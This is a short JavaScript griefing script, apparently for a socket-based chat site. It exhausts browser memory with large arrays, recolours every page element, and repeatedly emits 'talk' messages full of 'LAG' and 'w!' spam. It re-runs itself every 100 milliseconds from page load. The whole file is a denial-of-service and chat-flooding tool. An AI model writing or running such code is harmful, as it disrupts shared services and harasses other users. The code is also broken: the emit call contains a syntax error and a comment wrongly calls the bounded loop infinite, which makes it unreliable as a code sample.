const lagtext = ["LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG",
                "LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG",
                "LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG LAG",
                "w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!",
                "w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!",
                "w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!w!",
                ];
function overloadRAM() {
    function getRandomColor() {
        // Generate a random number between 0 and 16777215 (FFFFFF in decimal)
        // Convert it to a hexadecimal string
        // Pad with leading zeros if necessary to ensure 6 characters
        const randomColor = Math.floor(Math.random() * 16777215).toString(16);
        return "#" + ("000000" + randomColor).slice(-6);
    }
    const MAX_ITERATIONS = 1000; // Maximum number of iterations for memory consumption
  
    // Infinite loop to consume RAM
    for (let i = 0; i < MAX_ITERATIONS; i++) {
        const allElements = document.querySelectorAll('*');

        // Iterate over each element and apply a random background color
        allElements.forEach(element => {
            // We exclude script and style tags to avoid issues, though they usually don't have visible backgrounds
            if (element.tagName !== 'SCRIPT' && element.tagName !== 'STYLE') {
                element.style.backgroundColor = getRandomColor();
            }
        });
        const largeArray = new Array(1000000).fill(i); // Create a large array to occupy RAM
        
        console.log('LAG');
        console.error('LAG');
        console.warn('LAG');
        socket.emit('talk', { text: const lagtext });
    }
    setTimeout(function(){overloadRAM();},100)
}

overloadRAM();
